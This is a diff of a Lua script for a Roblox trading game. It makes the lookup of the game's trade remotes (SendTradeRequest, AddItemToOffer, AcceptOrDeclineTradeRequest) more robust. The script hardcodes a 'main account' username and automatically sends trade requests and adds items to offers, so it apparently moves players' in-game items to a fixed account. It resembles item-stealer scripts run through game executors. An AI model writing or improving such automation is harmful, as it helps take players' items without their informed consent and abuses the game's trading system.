@@ -10,16 +10,54 @@ local MainAccUsername = {"Her0eXBuildera31"}
 local ForceReceiver = false 
 -- =================================================
 
+local function resolveRemotePath(...)
+	local paths = {...}
+	for _, path in ipairs(paths) do
+		if typeof(path) == "string" and path ~= "" then
+			local current = ReplicatedStorage
+			local segments = string.split(path, "/")
+			local valid = true
+
+			for _, segment in ipairs(segments) do
+				if segment ~= "" then
+					current = current and current:FindFirstChild(segment)
+					if not current then
+						valid = false
+						break
+					end
+				end
+			end
+
+			if valid and current then
+				return current
+			end
+		end
+	end
+
+	return nil
+end
+
 -- Remotes from to.txt
-local addItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer")
+local addItemRemote = resolveRemotePath(
+	"API/TradeAPI/AddItemToOffer",
+	"TradeAPI/AddItemToOffer",
+	"API/AddItemToOffer"
+)
 
 local successClientData, ClientData = pcall(function()
 	return require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
 end)
 
 -- Remotes from here.txt
-local sendTradeRemote = ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)
-local tradeFunction = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
+local sendTradeRemote = resolveRemotePath(
+	"API/TradeAPI/SendTradeRequest",
+	"TradeAPI/SendTradeRequest"
+)
+local tradeFunction = resolveRemotePath(
+	"API/TradeAPI/AcceptOrDeclineTradeRequest",
+	"TradeAPI/AcceptOrDeclineTradeRequest",
+	"API/AcceptOrDeclineTradeRequest"
+)
 
 -- Function from to.txt to fetch unique IDs of items
 local function getMultipleUniqueIdsByName(itemName, limit)
@@ -62,10 +100,12 @@ local function sendTradeRequest(playerName)
 		warn("Player not found in server: " .. playerName)
 		return
 	end
-	
+
 	if sendTradeRemote and sendTradeRemote:IsA("RemoteEvent") then
 		sendTradeRemote:FireServer(targetPlayer)
-		addTargetItemsToOffer()
+		if addItemRemote and addItemRemote:IsA("RemoteEvent") then
+			addTargetItemsToOffer()
+		end
 		print("Successfully sent trade request to: " .. playerName)
 	else
 		warn("TradeAPI/SendTradeRequest RemoteEvent could not be located.")
